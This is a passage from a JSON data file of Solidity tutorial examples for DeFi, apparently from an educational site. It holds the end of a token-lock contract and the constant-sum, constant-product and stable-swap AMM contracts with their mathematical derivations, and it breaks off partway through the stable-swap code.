amount);\n        }\n    }\n\n    function sync(address token) external auth {\n        uint256 reserved = freed[token] + locks[token].amount;\n        uint256 bal = IERC20(token).balanceOf(address(this));\n        if (bal > reserved) {\n            IERC20(token).transfer(msg.sender, bal - reserved);\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "token",
      "lock"
    ],
    "order": 17
  },
  {
    "slug": "constant-sum-amm",
    "title": "Constant Sum AMM",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Constant sum AMM",
    "content": "Constant sum AMM `X + Y = K`\n\nTokens trade one to one.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract CSAMM {\n    IERC20 public immutable token0;\n    IERC20 public immutable token1;\n\n    uint256 public reserve0;\n    uint256 public reserve1;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token0, address _token1) {\n        // NOTE: This contract assumes that token0 and token1\n        // both have same decimals\n        token0 = IERC20(_token0);\n        token1 = IERC20(_token1);\n    }\n\n    function _mint(address _to, uint256 _amount) private {\n        balanceOf[_to] += _amount;\n        totalSupply += _amount;\n    }\n\n    function _burn(address _from, uint256 _amount) private {\n        balanceOf[_from] -= _amount;\n        totalSupply -= _amount;\n    }\n\n    function _update(uint256 _res0, uint256 _res1) private {\n        reserve0 = _res0;\n        reserve1 = _res1;\n    }\n\n    function swap(address _tokenIn, uint256 _amountIn)\n        external\n        returns (uint256 amountOut)\n    {\n        require(\n            _tokenIn == address(token0) || _tokenIn == address(token1),\n            \"invalid token\"\n        );\n\n        bool isToken0 = _tokenIn == address(token0);\n\n        (IERC20 tokenIn, IERC20 tokenOut, uint256 resIn, uint256 resOut) =\n        isToken0\n            ? (token0, token1, reserve0, reserve1)\n            : (token1, token0, reserve1, reserve0);\n\n        tokenIn.transferFrom(msg.sender, address(this), _amountIn);\n        uint256 amountIn = tokenIn.balanceOf(address(this)) - resIn;\n\n        // 0.3% fee\n        amountOut = (amountIn * 997) / 1000;\n\n        (uint256 res0, uint256 res1) = isToken0\n            ? (resIn + amountIn, resOut - amountOut)\n            : (resOut - amountOut, resIn + amountIn);\n\n        _update(res0, res1);\n        tokenOut.transfer(msg.sender, amountOut);\n    }\n\n    function addLiquidity(uint256 _amount0, uint256 _amount1)\n        external\n        returns (uint256 shares)\n    {\n        token0.transferFrom(msg.sender, address(this), _amount0);\n        token1.transferFrom(msg.sender, address(this), _amount1);\n\n        uint256 bal0 = token0.balanceOf(address(this));\n        uint256 bal1 = token1.balanceOf(address(this));\n\n        uint256 d0 = bal0 - reserve0;\n        uint256 d1 = bal1 - reserve1;\n\n        /*\n        a = amount in\n        L = total liquidity\n        s = shares to mint\n        T = total supply\n\n        s should be proportional to increase from L to L + a\n        (L + a) / L = (T + s) / T\n\n        s = a * T / L\n        */\n        if (totalSupply > 0) {\n            shares = ((d0 + d1) * totalSupply) / (reserve0 + reserve1);\n        } else {\n            shares = d0 + d1;\n        }\n\n        require(shares > 0, \"shares = 0\");\n        _mint(msg.sender, shares);\n\n        _update(bal0, bal1);\n    }\n\n    function removeLiquidity(uint256 _shares)\n        external\n        returns (uint256 d0, uint256 d1)\n    {\n        /*\n        a = amount out\n        L = total liquidity\n        s = shares\n        T = total supply\n\n        a / L = s / T\n\n        a = L * s / T\n          = (reserve0 + reserve1) * s / T\n        */\n        d0 = (reserve0 * _shares) / totalSupply;\n        d1 = (reserve1 * _shares) / totalSupply;\n\n        _burn(msg.sender, _shares);\n        _update(reserve0 - d0, reserve1 - d1);\n\n        if (d0 > 0) {\n            token0.transfer(msg.sender, d0);\n        }\n        if (d1 > 0) {\n            token1.transfer(msg.sender, d1);\n        }\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "CSAMM.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract CSAMM {\n    IERC20 public immutable token0;\n    IERC20 public immutable token1;\n\n    uint256 public reserve0;\n    uint256 public reserve1;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token0, address _token1) {\n        // NOTE: This contract assumes that token0 and token1\n        // both have same decimals\n        token0 = IERC20(_token0);\n        token1 = IERC20(_token1);\n    }\n\n    function _mint(address _to, uint256 _amount) private {\n        balanceOf[_to] += _amount;\n        totalSupply += _amount;\n    }\n\n    function _burn(address _from, uint256 _amount) private {\n        balanceOf[_from] -= _amount;\n        totalSupply -= _amount;\n    }\n\n    function _update(uint256 _res0, uint256 _res1) private {\n        reserve0 = _res0;\n        reserve1 = _res1;\n    }\n\n    function swap(address _tokenIn, uint256 _amountIn)\n        external\n        returns (uint256 amountOut)\n    {\n        require(\n            _tokenIn == address(token0) || _tokenIn == address(token1),\n            \"invalid token\"\n        );\n\n        bool isToken0 = _tokenIn == address(token0);\n\n        (IERC20 tokenIn, IERC20 tokenOut, uint256 resIn, uint256 resOut) =\n        isToken0\n            ? (token0, token1, reserve0, reserve1)\n            : (token1, token0, reserve1, reserve0);\n\n        tokenIn.transferFrom(msg.sender, address(this), _amountIn);\n        uint256 amountIn = tokenIn.balanceOf(address(this)) - resIn;\n\n        // 0.3% fee\n        amountOut = (amountIn * 997) / 1000;\n\n        (uint256 res0, uint256 res1) = isToken0\n            ? (resIn + amountIn, resOut - amountOut)\n            : (resOut - amountOut, resIn + amountIn);\n\n        _update(res0, res1);\n        tokenOut.transfer(msg.sender, amountOut);\n    }\n\n    function addLiquidity(uint256 _amount0, uint256 _amount1)\n        external\n        returns (uint256 shares)\n    {\n        token0.transferFrom(msg.sender, address(this), _amount0);\n        token1.transferFrom(msg.sender, address(this), _amount1);\n\n        uint256 bal0 = token0.balanceOf(address(this));\n        uint256 bal1 = token1.balanceOf(address(this));\n\n        uint256 d0 = bal0 - reserve0;\n        uint256 d1 = bal1 - reserve1;\n\n        /*\n        a = amount in\n        L = total liquidity\n        s = shares to mint\n        T = total supply\n\n        s should be proportional to increase from L to L + a\n        (L + a) / L = (T + s) / T\n\n        s = a * T / L\n        */\n        if (totalSupply > 0) {\n            shares = ((d0 + d1) * totalSupply) / (reserve0 + reserve1);\n        } else {\n            shares = d0 + d1;\n        }\n\n        require(shares > 0, \"shares = 0\");\n        _mint(msg.sender, shares);\n\n        _update(bal0, bal1);\n    }\n\n    function removeLiquidity(uint256 _shares)\n        external\n        returns (uint256 d0, uint256 d1)\n    {\n        /*\n        a = amount out\n        L = total liquidity\n        s = shares\n        T = total supply\n\n        a / L = s / T\n\n        a = L * s / T\n          = (reserve0 + reserve1) * s / T\n        */\n        d0 = (reserve0 * _shares) / totalSupply;\n        d1 = (reserve1 * _shares) / totalSupply;\n\n        _burn(msg.sender, _shares);\n        _update(reserve0 - d0, reserve1 - d1);\n\n        if (d0 > 0) {\n            token0.transfer(msg.sender, d0);\n        }\n        if (d1 > 0) {\n            token1.transfer(msg.sender, d1);\n        }\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "constant",
      "sum",
      "amm"
    ],
    "order": 18
  },
  {
    "slug": "constant-product-amm",
    "title": "Constant Product AMM",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Constant product AMM",
    "content": "Constant product AMM `XY = K`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract CPAMM {\n    IERC20 public immutable token0;\n    IERC20 public immutable token1;\n\n    uint256 public reserve0;\n    uint256 public reserve1;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token0, address _token1) {\n        token0 = IERC20(_token0);\n        token1 = IERC20(_token1);\n    }\n\n    function _mint(address _to, uint256 _amount) private {\n        balanceOf[_to] += _amount;\n        totalSupply += _amount;\n    }\n\n    function _burn(address _from, uint256 _amount) private {\n        balanceOf[_from] -= _amount;\n        totalSupply -= _amount;\n    }\n\n    function _update(uint256 _reserve0, uint256 _reserve1) private {\n        reserve0 = _reserve0;\n        reserve1 = _reserve1;\n    }\n\n    function swap(address _tokenIn, uint256 _amountIn)\n        external\n        returns (uint256 amountOut)\n    {\n        require(\n            _tokenIn == address(token0) || _tokenIn == address(token1),\n            \"invalid token\"\n        );\n        require(_amountIn > 0, \"amount in = 0\");\n\n        bool isToken0 = _tokenIn == address(token0);\n        (IERC20 tokenIn, IERC20 tokenOut, uint256 reserveIn, uint256 reserveOut)\n        = isToken0\n            ? (token0, token1, reserve0, reserve1)\n            : (token1, token0, reserve1, reserve0);\n\n        tokenIn.transferFrom(msg.sender, address(this), _amountIn);\n\n        /*\n        How many dy for dx?\n\n        xy = k\n        (x + dx)(y - dy) = k\n        y - dy = k / (x + dx)\n        y - k / (x + dx) = dy\n        y - xy / (x + dx) = dy\n        (yx + ydx - xy) / (x + dx) = dy\n        ydx / (x + dx) = dy\n        */\n        // 0.3% fee\n        uint256 amountInWithFee = (_amountIn * 997) / 1000;\n        amountOut =\n            (reserveOut * amountInWithFee) / (reserveIn + amountInWithFee);\n\n        tokenOut.transfer(msg.sender, amountOut);\n\n        _update(\n            token0.balanceOf(address(this)), token1.balanceOf(address(this))\n        );\n    }\n\n    function addLiquidity(uint256 _amount0, uint256 _amount1)\n        external\n        returns (uint256 shares)\n    {\n        token0.transferFrom(msg.sender, address(this), _amount0);\n        token1.transferFrom(msg.sender, address(this), _amount1);\n\n        /*\n        How many dx, dy to add?\n\n        xy = k\n        (x + dx)(y + dy) = k'\n\n        No price change, before and after adding liquidity\n        x / y = (x + dx) / (y + dy)\n\n        x(y + dy) = y(x + dx)\n        x * dy = y * dx\n\n        x / y = dx / dy\n        dy = y / x * dx\n        */\n        if (reserve0 > 0 || reserve1 > 0) {\n            require(\n                reserve0 * _amount1 == reserve1 * _amount0, \"x / y != dx / dy\"\n            );\n        }\n\n        /*\n        How many shares to mint?\n\n        f(x, y) = value of liquidity\n        We will define f(x, y) = sqrt(xy)\n\n        L0 = f(x, y)\n        L1 = f(x + dx, y + dy)\n        T = total shares\n        s = shares to mint\n\n        Total shares should increase proportional to increase in liquidity\n        L1 / L0 = (T + s) / T\n\n        L1 * T = L0 * (T + s)\n\n        (L1 - L0) * T / L0 = s\n        */\n\n        /*\n        Claim\n        (L1 - L0) / L0 = dx / x = dy / y\n\n        Proof\n        --- Equation 1 ---\n        (L1 - L0) / L0 = (sqrt((x + dx)(y + dy)) - sqrt(xy)) / sqrt(xy)\n\n        dx / dy = x / y so replace dy = dx * y / x\n\n        --- Equation 2 ---\n        Equation 1 = (sqrt(xy + 2ydx + dx^2 * y / x) - sqrt(xy)) / sqrt(xy)\n\n        Multiply by sqrt(x) / sqrt(x)\n        Equation 2 = (sqrt(x^2y + 2xydx + dx^2 * y) - sqrt(x^2y)) / sqrt(x^2y)\n                   = (sqrt(y)(sqrt(x^2 + 2xdx + dx^2) - sqrt(x^2)) / (sqrt(y)sqrt(x^2))\n\n        sqrt(y) on top and bottom cancels out\n\n        --- Equation 3 ---\n        Equation 2 = (sqrt(x^2 + 2xdx + dx^2) - sqrt(x^2)) / (sqrt(x^2)\n        = (sqrt((x + dx)^2) - sqrt(x^2)) / sqrt(x^2)\n        = ((x + dx) - x) / x\n        = dx / x\n\n        Since dx / dy = x / y,\n        dx / x = dy / y\n\n        Finally\n        (L1 - L0) / L0 = dx / x = dy / y\n        */\n        if (totalSupply == 0) {\n            shares = _sqrt(_amount0 * _amount1);\n        } else {\n            shares = _min(\n                (_amount0 * totalSupply) / reserve0,\n                (_amount1 * totalSupply) / reserve1\n            );\n        }\n        require(shares > 0, \"shares = 0\");\n        _mint(msg.sender, shares);\n\n        _update(\n            token0.balanceOf(address(this)), token1.balanceOf(address(this))\n        );\n    }\n\n    function removeLiquidity(uint256 _shares)\n        external\n        returns (uint256 amount0, uint256 amount1)\n    {\n        /*\n        Claim\n        dx, dy = amount of liquidity to remove\n        dx = s / T * x\n        dy = s / T * y\n\n        Proof\n        Let's find dx, dy such that\n        v / L = s / T\n\n        where\n        v = f(dx, dy) = sqrt(dxdy)\n        L = total liquidity = sqrt(xy)\n        s = shares\n        T = total supply\n\n        --- Equation 1 ---\n        v = s / T * L\n        sqrt(dxdy) = s / T * sqrt(xy)\n\n        Amount of liquidity to remove must not change price so\n        dx / dy = x / y\n\n        replace dy = dx * y / x\n        sqrt(dxdy) = sqrt(dx * dx * y / x) = dx * sqrt(y / x)\n\n        Divide both sides of Equation 1 with sqrt(y / x)\n        dx = s / T * sqrt(xy) / sqrt(y / x)\n           = s / T * sqrt(x^2) = s / T * x\n\n        Likewise\n        dy = s / T * y\n        */\n\n        // bal0 >= reserve0\n        // bal1 >= reserve1\n        uint256 bal0 = token0.balanceOf(address(this));\n        uint256 bal1 = token1.balanceOf(address(this));\n\n        amount0 = (_shares * bal0) / totalSupply;\n        amount1 = (_shares * bal1) / totalSupply;\n        require(amount0 > 0 && amount1 > 0, \"amount0 or amount1 = 0\");\n\n        _burn(msg.sender, _shares);\n        _update(bal0 - amount0, bal1 - amount1);\n\n        token0.transfer(msg.sender, amount0);\n        token1.transfer(msg.sender, amount1);\n    }\n\n    function _sqrt(uint256 y) private pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n\n    function _min(uint256 x, uint256 y) private pure returns (uint256) {\n        return x <= y ? x : y;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "CPAMM.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract CPAMM {\n    IERC20 public immutable token0;\n    IERC20 public immutable token1;\n\n    uint256 public reserve0;\n    uint256 public reserve1;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token0, address _token1) {\n        token0 = IERC20(_token0);\n        token1 = IERC20(_token1);\n    }\n\n    function _mint(address _to, uint256 _amount) private {\n        balanceOf[_to] += _amount;\n        totalSupply += _amount;\n    }\n\n    function _burn(address _from, uint256 _amount) private {\n        balanceOf[_from] -= _amount;\n        totalSupply -= _amount;\n    }\n\n    function _update(uint256 _reserve0, uint256 _reserve1) private {\n        reserve0 = _reserve0;\n        reserve1 = _reserve1;\n    }\n\n    function swap(address _tokenIn, uint256 _amountIn)\n        external\n        returns (uint256 amountOut)\n    {\n        require(\n            _tokenIn == address(token0) || _tokenIn == address(token1),\n            \"invalid token\"\n        );\n        require(_amountIn > 0, \"amount in = 0\");\n\n        bool isToken0 = _tokenIn == address(token0);\n        (IERC20 tokenIn, IERC20 tokenOut, uint256 reserveIn, uint256 reserveOut)\n        = isToken0\n            ? (token0, token1, reserve0, reserve1)\n            : (token1, token0, reserve1, reserve0);\n\n        tokenIn.transferFrom(msg.sender, address(this), _amountIn);\n\n        /*\n        How many dy for dx?\n\n        xy = k\n        (x + dx)(y - dy) = k\n        y - dy = k / (x + dx)\n        y - k / (x + dx) = dy\n        y - xy / (x + dx) = dy\n        (yx + ydx - xy) / (x + dx) = dy\n        ydx / (x + dx) = dy\n        */\n        // 0.3% fee\n        uint256 amountInWithFee = (_amountIn * 997) / 1000;\n        amountOut =\n            (reserveOut * amountInWithFee) / (reserveIn + amountInWithFee);\n\n        tokenOut.transfer(msg.sender, amountOut);\n\n        _update(\n            token0.balanceOf(address(this)), token1.balanceOf(address(this))\n        );\n    }\n\n    function addLiquidity(uint256 _amount0, uint256 _amount1)\n        external\n        returns (uint256 shares)\n    {\n        token0.transferFrom(msg.sender, address(this), _amount0);\n        token1.transferFrom(msg.sender, address(this), _amount1);\n\n        /*\n        How many dx, dy to add?\n\n        xy = k\n        (x + dx)(y + dy) = k'\n\n        No price change, before and after adding liquidity\n        x / y = (x + dx) / (y + dy)\n\n        x(y + dy) = y(x + dx)\n        x * dy = y * dx\n\n        x / y = dx / dy\n        dy = y / x * dx\n        */\n        if (reserve0 > 0 || reserve1 > 0) {\n            require(\n                reserve0 * _amount1 == reserve1 * _amount0, \"x / y != dx / dy\"\n            );\n        }\n\n        /*\n        How many shares to mint?\n\n        f(x, y) = value of liquidity\n        We will define f(x, y) = sqrt(xy)\n\n        L0 = f(x, y)\n        L1 = f(x + dx, y + dy)\n        T = total shares\n        s = shares to mint\n\n        Total shares should increase proportional to increase in liquidity\n        L1 / L0 = (T + s) / T\n\n        L1 * T = L0 * (T + s)\n\n        (L1 - L0) * T / L0 = s\n        */\n\n        /*\n        Claim\n        (L1 - L0) / L0 = dx / x = dy / y\n\n        Proof\n        --- Equation 1 ---\n        (L1 - L0) / L0 = (sqrt((x + dx)(y + dy)) - sqrt(xy)) / sqrt(xy)\n\n        dx / dy = x / y so replace dy = dx * y / x\n\n        --- Equation 2 ---\n        Equation 1 = (sqrt(xy + 2ydx + dx^2 * y / x) - sqrt(xy)) / sqrt(xy)\n\n        Multiply by sqrt(x) / sqrt(x)\n        Equation 2 = (sqrt(x^2y + 2xydx + dx^2 * y) - sqrt(x^2y)) / sqrt(x^2y)\n                   = (sqrt(y)(sqrt(x^2 + 2xdx + dx^2) - sqrt(x^2)) / (sqrt(y)sqrt(x^2))\n\n        sqrt(y) on top and bottom cancels out\n\n        --- Equation 3 ---\n        Equation 2 = (sqrt(x^2 + 2xdx + dx^2) - sqrt(x^2)) / (sqrt(x^2)\n        = (sqrt((x + dx)^2) - sqrt(x^2)) / sqrt(x^2)\n        = ((x + dx) - x) / x\n        = dx / x\n\n        Since dx / dy = x / y,\n        dx / x = dy / y\n\n        Finally\n        (L1 - L0) / L0 = dx / x = dy / y\n        */\n        if (totalSupply == 0) {\n            shares = _sqrt(_amount0 * _amount1);\n        } else {\n            shares = _min(\n                (_amount0 * totalSupply) / reserve0,\n                (_amount1 * totalSupply) / reserve1\n            );\n        }\n        require(shares > 0, \"shares = 0\");\n        _mint(msg.sender, shares);\n\n        _update(\n            token0.balanceOf(address(this)), token1.balanceOf(address(this))\n        );\n    }\n\n    function removeLiquidity(uint256 _shares)\n        external\n        returns (uint256 amount0, uint256 amount1)\n    {\n        /*\n        Claim\n        dx, dy = amount of liquidity to remove\n        dx = s / T * x\n        dy = s / T * y\n\n        Proof\n        Let's find dx, dy such that\n        v / L = s / T\n\n        where\n        v = f(dx, dy) = sqrt(dxdy)\n        L = total liquidity = sqrt(xy)\n        s = shares\n        T = total supply\n\n        --- Equation 1 ---\n        v = s / T * L\n        sqrt(dxdy) = s / T * sqrt(xy)\n\n        Amount of liquidity to remove must not change price so\n        dx / dy = x / y\n\n        replace dy = dx * y / x\n        sqrt(dxdy) = sqrt(dx * dx * y / x) = dx * sqrt(y / x)\n\n        Divide both sides of Equation 1 with sqrt(y / x)\n        dx = s / T * sqrt(xy) / sqrt(y / x)\n           = s / T * sqrt(x^2) = s / T * x\n\n        Likewise\n        dy = s / T * y\n        */\n\n        // bal0 >= reserve0\n        // bal1 >= reserve1\n        uint256 bal0 = token0.balanceOf(address(this));\n        uint256 bal1 = token1.balanceOf(address(this));\n\n        amount0 = (_shares * bal0) / totalSupply;\n        amount1 = (_shares * bal1) / totalSupply;\n        require(amount0 > 0 && amount1 > 0, \"amount0 or amount1 = 0\");\n\n        _burn(msg.sender, _shares);\n        _update(bal0 - amount0, bal1 - amount1);\n\n        token0.transfer(msg.sender, amount0);\n        token1.transfer(msg.sender, amount1);\n    }\n\n    function _sqrt(uint256 y) private pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n\n    function _min(uint256 x, uint256 y) private pure returns (uint256) {\n        return x <= y ? x : y;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "constant",
      "product",
      "amm"
    ],
    "order": 19
  },
  {
    "slug": "stable-swap-amm",
    "title": "Stable Swap AMM",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Curve's stable swap AMM",
    "content": "Simplified version of Curve's stable swap AMM\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nInvariant - price of trade and amount of liquidity are determined by this equation\n\nAn^n sum(x_i) + D = ADn^n + D^(n + 1) / (n^n prod(x_i))\n\nTopics\n0. Newton's method x_(n + 1) = x_n - f(x_n) / f'(x_n)\n1. Invariant\n2. Swap\n   - Calculate Y\n   - Calculate D\n3. Get virtual price\n4. Add liquidity\n   - Imbalance fee\n5. Remove liquidity\n6. Remove liquidity one token\n   - Calculate withdraw one token\n   - getYD\nTODO: test?\n*/\n\nlibrary Math {\n    function abs(uint256 x, uint256 y) internal pure returns (uint256) {\n        return x >= y ? x - y : y - x;\n    }\n}\n\ncontract StableSwap {\n    // Number of tokens\n    uint256 private constant N = 3;\n    // Amplification coefficient multiplied by N^(N - 1)\n    // Higher value makes the curve more flat\n    // Lower value makes the curve more like constant product AMM\n    uint256 private constant A = 1000 * (N ** (N - 1));\n    // 0.03%\n    uint256 private constant SWAP_FEE = 300;\n    // Liquidity fee is derived from 2 constraints\n    // 1. Fee is 0 for adding / removing liquidity that results in a balanced pool\n    // 2. Swapping in a balanced pool is like adding and then removing liquidity\n    //    from a balanced pool\n    // swap fee = add liquidity fee + remove liquidity fee\n    uint256 private constant LIQUIDITY_FEE = (SWAP_FEE * N) / (4 * (N - 1));\n    uint256 private constant FEE_DENOMINATOR = 1e6;\n\n    address[N] public tokens;\n    // Normalize each token to 18 decimals\n    // Example - DAI (18 decimals), USDC (6 decimals), USDT (6 decimals)\n    uint256[N] private multipliers = [1, 1e12, 1e12];\n    uint256[N] public balances;\n\n    // 1 share = 1e18, 18 decimals\n    uint256 private constant DECIMALS = 18;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address[N] memory _tokens) {\n        tokens = _tokens;\n    }\n\n    function _mint(address _to, uint256 _amount) private {\n        balanceOf[_to] += _amount;\n        totalSupply += _amount;\n    }\n\n    function _burn(address _from, uint256 _amount) private {\n        balanceOf[_from] -= _amount;\n        totalSupply -= _amount;\n    }\n\n    // Return precision-adjusted balances, adjusted to 18 decimals\n    function _xp() private view returns (uint256[N] memory xp) {\n        for (uint256 i; i < N; ++i) {\n            xp[i] = balances[i] * multipliers[i];\n        }\n    }\n\n    /**\n     * @notice Calculate D, sum of balances in a perfectly balanced pool\n     * If balances of x_0, x_1, ... x_(n-1) then sum(x_i) = D\n     * @param xp Precision-adjusted balances\n     * @return D\n     */\n    function _getD(uint256[N] memory xp) private pure returns (uint256) {\n        /*\n        Newton's method to compute D\n        -----------------------------\n        f(D) = ADn^n + D^(n + 1) / (n^n prod(x_i)) - An^n sum(x_i) - D \n        f'(D) = An^n + (n + 1) D^n / (n^n prod(x_i)) - 1\n\n                     (as + np)D_n\n        D_(n+1) = -----------------------\n                  (a - 1)D_n + (n + 1)p\n\n        a = An^n\n        s = sum(x_i)\n        p = (D_n)^(n + 1) / (n^n prod(x_i))\n        */\n        uint256 a = A * N; // An^n\n\n        uint256 s; // x_0 + x_1 + ... + x_(n-1)\n        for (uint256 i; i < N; ++i) {\n            s += xp[i];\n        }\n\n        // Newton's method\n        // Initial guess, d <= s\n        uint256 d = s;\n        uint256 d_prev;\n        for (uint256 i; i < 255; ++i) {\n            // p = D^(n + 1) / (n^n * x_0 * ... * x_(n-1))\n            uint256 p = d;\n            for (uint256 j; j < N; ++j) {\n                p = (p * d) / (N * xp[j]);\n            }\n            d_prev = d;\n            d = ((a * s + N * p) * d) / ((a - 1) * d + (N + 1) * p);\n\n            if (Math.abs(d, d_prev) <= 1) {\n                return d;\n            }\n        }\n        revert(\"D didn't converge\");\n    }\n\n    /**\n     * @notice Calculate the new balance of token j given the new balance of token i\n     * @param i Index of token in\n     * @param j Index of token out\n     * @param x New balance of token i\n     * @param xp Current precision-adjusted balances\n     */\n    function _getY(uint256 i, uint256 j, uint256 x, uint256[N] memory xp)\n        private\n        pure\n        returns (uint256)\n    {\n        /*\n        Newton's method to compute y\n        -----------------------------\n        y = x_j\n\n        f(y) = y^2 + y(b - D) - c\n\n                    y_n^2 + c\n        y_(n+1) = --------------\n                   2y_n + b - D\n\n        where\n        s = sum(x_k), k != j\n        p = prod(x_k), k != j\n        b = s + D / (An^n)\n        c = D^(n + 1) / (n^n * p * An^n)\n        */\n        uint256 a = A * N;\n        uint256 d = _getD(xp);\n        uint256 s;\n        uint256 c = d;\n\n        uint256 _x;\n        for (uint256 k; k < N; ++k) {\n            if (k == i) {\n                _x = x;\n            } else if (k == j) {\n                continue;\n            } else {\n                _x = xp[k];\n            }\n\n            s += _x;\n            c = (c * d) / (N * _x);\n        }\n        c = (c * d) / (N * a);\n        uint256 b = s + d / a;\n\n        // Newton's method\n        uint256 y_prev;\n        // Initial guess, y <= d\n        uint256 y = d;\n        for (uint256 _i; _i < 255; ++_i) {\n            y_prev = y;\n            y = (y * y + c) / (2 * y + b - d);\n            if (Math.abs(y, y_prev) <= 1) {\n                return y;\n            }\n        }\n        revert(\"y didn't converge\");\n    }\n\n    /**\n     * @notice Calculate the new balance of token i given precision-adjusted\n     * balances xp and liquidity d\n     * @dev Equation is calculate y is same as _getY\n     * @param i Index of token to calculate the new balance\n     * @param xp Precision-adjusted balances\n     * @param d Liquidity d\n     * @return New balance of token i\n     */\n    function _getYD(uint256 i, uint256[N] memory xp, uint256 d)\n        private\n        pure\n        returns (uint256)\n    {\n        uint256 a = A * N;\n        uint256 s;\n        uint256 c = d;\n\n        uint256 _x;\n        for (uint256 k; k < N; ++k) {\n            if (k != i) {\n                _x = xp[k];\n            } else {\n                continue;\n            }\n\n            s += _x;\n            c = (c * d) / (N * _x);\n        }\n        c = (c * d) / (N * a);\n        uint256 b = s + d / a;\n\n        // Newton's method\n        uint256 y_prev;\n        // Initial guess, y <= d\n        uint256 y = d;\n        for (uint256 _i; _i < 255; ++_i) {\n            y_prev = y;\n            y = (y * y + c) / (2 * y + b - d);\n            if (Math.abs(y, y_prev) <= 1) {\n                return y;\n            }\n        }\n        revert(\"y didn't converge\");\n    }\n\n    // Estimate value of 1 share\n    // How many tokens is one share worth?\n    function getVirtualPrice() external view returns (uint256) {\n        uint256 d = _getD(_xp());\n        uint256 _totalSupply = totalSupply;\n        if (_totalSupply > 0) {\n            return (d * 10 ** DECIMALS) / _totalSupply;\n        }\n        return 0;\n    }\n\n    /**\n     * @notice Swap dx amount of token i for token j\n     * @param i Index of token in\n     * @param j Index of token out\n     * @param dx Token in amount\n     * @param minDy Minimum token out\n     */\n    function swap(uint256 i, uint256 j, uint256 dx, uint256 minDy)\n        external\n        returns (uint256 dy)\n    {\n        require(i != j, \"i = j\");\n\n        IERC20(tokens[i]).transferFrom(msg.sender, address(this), dx);\n\n        // Calculate dy\n        uint256[N] memory xp = _xp();\n        uint256 x = xp[i] + dx * multipliers[i];\n\n        uint256 y0 = xp[j];\n        uint256 y1 = _getY(i, j, x, xp);\n        // y0 must be >= y1, since x has increased\n        // -1 to round down\n        dy = (y0 - y1 - 1) / multipliers[j];\n\n        // Subtract fee from dy\n        uint256 fee = (dy * SWAP_FEE) / FEE_DENOMINATOR;\n        dy -= fee;\n        require(dy >= minDy, \"dy < min\");\n\n        balances[i] += dx;\n        balances[j] -= dy;\n\n        IERC20(tokens[j]).transfer(msg.sender, dy);\n    }\n\n    function addLiquidity(uint256[N] calldata amounts, uint256 minShares)\n        external\n        returns (uint256 shares)\n    {\n        // calculate current liquidity d0\n        uint256 _totalSupply = totalSupply;\n        uint256 d0;\n        uint256[N] memory old_xs = _xp();\n        if (_totalSupply > 0) {\n            d0 = _getD(old_xs);\n        }\n\n        // Transfer tokens in\n        uint256[N] memory new_xs;\n        for (uint256 i; i < N; ++i) {\n            uint256 amount = amounts[i];\n            if (amount > 0) {\n                IERC20(tokens[i]).transferFrom(\n                    msg.sender, address(this), amount\n                );\n                new_xs[i] = old_xs[i] + amount * multipliers[i];\n            } else {\n                new_xs[i] = old_xs[i];\n            }\n        }\n\n        // Calculate new liquidity d1\n        uint256 d1 = _getD(new_xs);\n        require(d1 > d0, \"liquidity didn't increase\");\n\n        // Recalculate D accounting for fee on imbalance\n        uint256 d2;\n        if (_totalSupply > 0) {\n            